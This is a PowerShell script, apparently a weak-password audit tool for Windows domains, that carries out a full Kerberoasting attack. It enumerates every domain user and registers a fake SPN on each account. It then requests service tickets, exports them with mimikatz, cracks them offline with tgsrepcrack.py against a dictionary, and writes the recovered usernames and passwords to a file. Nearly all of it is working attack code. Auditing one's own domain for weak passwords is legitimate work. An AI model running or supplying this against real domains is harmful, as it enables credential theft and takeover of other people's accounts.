<#
domainAccountCheck.ps1
Author: JC (@chroblert)
#>
# 得到域中所有的用户
function Get-UserList
{
	# 将包含域用户账户的结果保存到$resultList中去
	$resultList = net group "domain users" /domain |%{ $_ -split " "}|%{ if ($_ -ne ""){$_.trim()}}
	# 上述列表中，包含一些杂乱的数据，需要将其进行清洗
	foreach ($line in $resultList){
		if($line.contains("---")){
			$start = $resultList.indexof($line) + 1
			# 减去2是因为最后一个的下标比数量少1，且最后一个不是有效的账户
			$end = $resultList.count - 2 
		}
	}
	$userListA = $resultList[$start..$end]
	$userList = New-Object System.Collections.ArrayList
	foreach ($user in $userListA){
		if( -Not $user.contains("$")){
			$userList.add($user)|Out-Null
		}
	}
	Write-Host "保存域中所有的域用户账号到.\result\allUserList.txt文件中去"
	$userList | Out-File ".\result\allUserList.txt"
	return $userList.clone()
}
# 为域用户账户注册SPN
function Set-SPN{
	Param(
		[System.Collections.ArrayList] $allUserList
	)
	if($allUserList -eq $null){
		if(Test-Path ".\result\allUserList.txt"){
			Write-Host "使用result目录下的allUserList.txt文件进行操作"
			$allUserList = Get-Content .\result\allUserList.txt 
		}else{
			Write-Host "参数值错误，且不存在allUserList.txt文件,EXIT"
			return $false
		}
		
	}
	$sucUserList = New-Object System.Collections.ArrayList
	$faiUserList = New-Object System.Collections.ArrayList
	$sucSPNList = New-Object System.Collections.ArrayList
	$faiSPNList = New-Object System.Collections.ArrayList
	$allUserAndSPNList = New-Object System.Collections.ArrayList
	foreach ($num in 1..$allUserList.count){
		# 将要执行的命令进行动态拼接
		$SPNStr = "weakPasswordTest/JC-ISDevil" + $num
		$userStr = $allUserList[$num-1]
		$allUserAndSPNList.add($userStr + "|#|" + $SPNStr) | Out-Null
		# 执行包含命令的字符串
		# 使用Invoke-Expression后不知如何判断字符串命令执行的结果，因而弃用
		#Invoke-Expression $setStr
		# redirect error stream(2) to success stream(1)
		setspn -S $SPNStr -U $userStr 2>&1 | Out-Null
		if ($? -contains "True"){
			Write-Host -ForegroundColor Green "【+】" $userStr "注册成功"
			$sucUserList.add($userStr) | Out-Null
			$sucSPNList.add($SPNStr) | Out-Null
		}else{
			Write-Host -ForegroundColor Red "【-】" $userStr "注册失败"
			$faiUserList.add($userStr)|Out-Null
		}
		# 暂停 等待用户输入数据
		# Read-Host
	}
	Write-Host "保存所有user和SPN到.\result\allUserAndSPNList.txt文件中去"
	$allUserAndSPNList | Out-File ".\result\allUserAndSPNList.txt"
	Write-Host "保存注册SPN成功的域用户账号到.\result\sucUserList.txt文件中去"
	$sucUserList | Out-File ".\result\sucUserList.txt"
	Write-Host "保存注册SPN成功的SPN到.\result\sucSPNList.txt文件中去"
	$sucSPNList | Out-File ".\result\sucSPNList.txt"
	Write-Host "保存注册SPN失败的域用户账号到.\result\faiUserList.txt文件中去"
	$faiUserList | Out-File ".\result\faiUserList.txt"
	return $sucUserList,$sucSPNList,$faiUserList
}

function Del-SPN{
	Param(
		[System.Collections.ArrayList] $sucSPNListA,
		[System.Collections.ArrayList] $sucUserListA
	)
	if ($sucSPNListA -eq $null -or $sucUserListA -eq $null){
		if(Test-Path '.\result\sucSPNList.txt' -and Test-Path ".\result\sucUserList.txt"){
			Write-Host "传参错误，将启用文件sucSPNList.txt和sucUserList.txt中的内容"
			$sucSPNListA = Get-Content .\result\sucSPNList.txt  
			$sucUserListA = Get-Content .\result\sucUserList.txt 
		}else{
			Write-Host "传参错误且相关文件不存在，EXIT"
			return $false
		}
	}
	if ($sucSPNListA.count -ne $sucUserListA.count){
		Write-Host "SPN数量与用户数量不等，EXIT"
		return $false
	}
	if ($sucSPNListA.count -eq 0 -OR $sucUserListA.count -eq 0){
		Write-Host "数组为空，EXIT"
		return $false
	}
	foreach ($spnStr in $sucSPNListA){
		setspn -D $spnStr $sucUserListA[$sucSPNListA.indexof($spnStr)] 2>&1 |Out-Null
		if($? -contains "True") {
			Write-Host "删除成功"
		}else{
			Write-Host "删除失败"
		}
	}
	Write-Host "全部删除成功"
}

# 访问SPN得到TGS发放的服务票据ST
function Get-ServiceTicket{
	Param(
		[System.Collections.ArrayList] $sucSPNListB
	)
	# 引入系统模型
	Add-Type -AssemblyName System.IdentityModel
	foreach ($spnStr in $sucSPNListB){
		# 进行Kerberos的第三步
		New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  $spnStr	
	}
}
# 引入tgscrack来爆破下载下来的凭据
function Crack-ServiceTicket{
	Write-Host "正在爆破中ing.......请稍等"
	python27 .\kerberoast\tgsrepcrack.py .\Dicts\JCPasswd.txt .\*.kirbi | Tee-Object -Variable tgsCrackResult
	$passwdAndSPN = $tgsCrackResult | %{ if ($_.contains("found")){ $_}}|%{$_.split(" ")[5] + "#" +$_.split(" ")[-1].split("~")[0].split("@")[-1] + "/" + $_.split(" ")[-1].split("~")[-1].substring(0,($_.split(" ")[-1].split("~")[-1].lastindexof("-")))}
	# 
	if((Test-Path '.\result\sucSPNList.txt') -and (Test-Path ".\result\sucUserList.txt")){
		Write-Host "启用文件sucSPNList.txt和sucUserList.txt中的内容"
		$sucSPNList = Get-Content .\result\sucSPNList.txt  
		$sucUserList = Get-Content .\result\sucUserList.txt
	}else{
		Write-Host "相关文件不存在，EXIT"
		return $false
	}
	$userAndPasswdList = New-Object System.Collections.ArrayList
	foreach ($item in $passwdAndSPN){
		$spnStr = $item.split("#")[-1]
		$passwdStr = $item.split("#")[0]
		$userStr = $sucUserList[$sucSPNList.indexof($spnStr)]
		$userAndPasswd = $userStr + "|#|" + $passwdStr
		Write-Host -ForegroundColor Green "【+】" $userAndPasswd
		$userAndPasswdList.add($userAndPasswd) | Out-Null
	}
	Write-Host "将破解出的用户名和密码保存到userAndPasswdList.txt文件中去"
	$userAndPasswdList | Out-File ".\result\userAndPasswdList.txt"
}
# 删除保存下来的kirbi文件
function Del-ServiceTicket{
	$isDelet = Read-Host "是否删除下载的kirbi文件`n Y/n"
	if ($isDelet -eq "Y" -OR $isDelet -eq "yes"){
		$dirList = Get-ChildItem|select name|%{$_.name}
		foreach ($line in $dirList){
			if ($line.split(".")[-1] -eq "kirbi"){
				# 删除文件
				Remove-Item $line
				Write-Host "删+"
			}
		}
	}
}
# 创建一个用来保存结果的目录
if(-Not (Test-Path ".\result")){
	New-Item -ItemType Directory "result"
}
# 1. 获取用户
# Read-Host "获取到所有的域用户账户`n按任意键将继续执行" | Out-Null
# $allUserList = Get-UserList
# 2. 注册SPN
# Read-Host "为每一个域用户账号注册SPN`n按任意键将继续执行" | Out-Null
# $sucUserList,$sucSPNList,$faiUserList = Set-SPN $allUserList
# 3. 访问SPN获得ST
# Get-ServiceTicket $sucSPNList
# 4. 删除SPN
# Read-Host "下面将要为注册SPN成功的域用户账户删除SPN`n按任意键将继续执行"|Out-Null
# Del-SPN $sucSPNList $sucUserList
# 5. 导出系统中缓存的ST
# .\mimikatz\x64\mimikatz.exe "kerberos::list /export" exit
# 6. 爆破ST中含有的SPN的口令
Crack-ServiceTicket
# 7. 删除第5步中保存的.kirbi文件
# Del-ServiceTicket
Write-Host "ALL OVER"
